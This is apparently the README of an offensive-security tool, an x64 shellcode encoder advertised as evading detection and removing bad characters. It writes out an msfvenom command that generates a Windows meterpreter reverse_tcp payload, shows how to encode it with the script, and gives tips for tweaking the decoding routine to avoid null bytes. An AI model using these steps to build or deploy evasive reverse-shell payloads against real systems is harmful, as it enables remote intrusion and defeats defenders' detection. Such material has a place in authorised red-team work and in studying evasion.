# x64-shellcode-encoder
Custom 64 bit shellcode encoder that evades detection and removes some common badchars (\x00\x0a\x0d\x20)

## Usage
Using a generator such as msfvenom, run the following command:
```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw -o sc.bin```

Then, run the python script with the file containing shellcode bytes as an argument:
```python3 encoder-x64.py sc.bin```

The script will automatically look for the following common bad characters after encoding the shellcode (null bytes, new lines, carriage returns, spaces). This can be disabled by commenting out code on line 130 and uncommenting lines 128 + 129. This will make the encoded shellcode much shorter, but it will likely contain a few bad characters. The script will output what bad characters the encoded shell code ends up containing as well as their positions in the shellcode.

It is also worth noting that short shellcode (less than 255 bytes) will likely contain a null byte in the encoded shellcode in part of the decoding routine. This null byte comes from line 80, and if short shellcode must be used that does not contain null bytes, edit the script to do something along the lines of:
```mov cl, shellcode_length```
where the shellcode_length would be one byte long. This shortens the decoding routine by two bytes, so either add in a couple of null bytes or edit the offset on line 57 to account for it.
